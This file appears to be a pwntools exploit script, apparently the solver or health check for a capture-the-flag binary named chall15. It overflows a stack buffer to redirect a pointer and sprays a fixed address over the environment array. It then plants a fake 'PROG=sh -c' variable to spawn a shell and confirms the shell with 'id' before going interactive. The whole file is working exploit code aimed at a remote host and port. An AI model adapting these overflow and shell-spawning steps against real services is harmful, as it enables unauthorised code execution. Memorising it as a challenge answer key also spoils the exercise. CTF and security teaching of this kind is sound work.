#!/usr/bin/env python3
from pwn import *
import sys
import time

target_elf = ELF('../bin/chall15')

HOST = ''
PORT = 40015
ADDR = 0x0804b480

NUM_ATTEMPTS = 10

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]


def exploit_attempt():
    try:
        if len(HOST) > 0:
            io = remote(HOST, PORT, level='warn')
        else:
            io = target_elf.process(level='warn')

        sys.stdout.write(io.recvuntil('5!\n'))

        # step 1: there are two parts to this first step. Firstly we are overwriting
        #         the 'buffer' pointer on the stack, this ensures that the next loop
        #         will read data from stdin to a different location that we can know
        #         the address of. The reason that is important is because we are also
        #         going to be spraying the location of this string over the *envp array
        io.recvuntil(b'file:\x1b[0m ')
        io.send(cyclic(56)+p64(ADDR)+p32(ADDR+8)*256)

        # step 2: write the fake ENV var and pass a command string in the same write
        io.recvuntil(b'file:\x1b[0m ')
        io.sendline(b'sh\x00PROG=sh -c\x00')
        time.sleep(0.5)

        # step 3: collect a shell
        io.recvuntil(b'file:\x1b[0m ')
        io.sendline(b'id')
        id_result = io.recvline()
        if b'uid=' in id_result:
            log.success('shell: %s', id_result.decode('ascii').strip())
            if not os.environ.get('HEALTH_CHECK', False):
                io.interactive()
            sys.exit(0)
        else:
            log.failure('Error: %s', id_result)
            sys.exit(1)
    except EOFError as e:
        log.failure('Fail: EOF')
    except Exception as e:
        log.failure('Error: %s: %s', type(e), str(e))
    finally:
        io.close()
    return False

if __name__ == '__main__':
    for _ in range(NUM_ATTEMPTS):
        if exploit_attempt():
            sys.exit(0)
        sleep(0.1)
    sys.exit(1)
